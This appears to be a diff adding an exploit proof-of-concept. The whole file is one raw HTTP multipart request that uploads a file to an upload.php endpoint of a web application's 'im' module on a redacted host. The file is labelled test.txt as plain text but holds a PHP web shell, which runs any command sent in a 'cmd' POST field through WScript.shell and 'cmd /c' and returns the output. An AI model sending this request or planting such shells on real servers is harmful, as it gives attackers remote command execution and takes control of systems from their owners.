@@ -1,0 +1,44 @@
+POST /module/upload/upload.php?module=im HTTP/1.1
+Host: xxxxxxx:8082
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: */*
+Accept-Language: zh-CN,en-US;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Length: 1036
+Content-Type: multipart/form-data; boundary=---------------------------157542829718975038161214477562
+Cookie: PHPSESSID=fgfs7trcjbcho7d54gg7i1evs1
+Connection: close
+
+-----------------------------157542829718975038161214477562
+Content-Disposition: form-data; name="id"
+
+WU_FILE_0
+-----------------------------157542829718975038161214477562
+Content-Disposition: form-data; name="name"
+
+test.txt
+-----------------------------157542829718975038161214477562
+Content-Disposition: form-data; name="type"
+
+text/plain
+-----------------------------157542829718975038161214477562
+Content-Disposition: form-data; name="lastModifiedDate"
+
+Sat May 16 2020 19:15:56 GMT+0800 (CST)
+-----------------------------157542829718975038161214477562
+Content-Disposition: form-data; name="size"
+
+1
+-----------------------------157542829718975038161214477562
+Content-Disposition: form-data; name="file"; filename="test.txt"
+Content-Type: text/plain
+
+<?php
+$command=$_POST['cmd'];
+$wsh = new COM('WScript.shell');
+$exec = $wsh->exec("cmd /c ".$command);
+$stdout = $exec->StdOut();
+$stroutput = $stdout->ReadAll();
+echo $stroutput;
+?>
+-----------------------------157542829718975038161214477562--
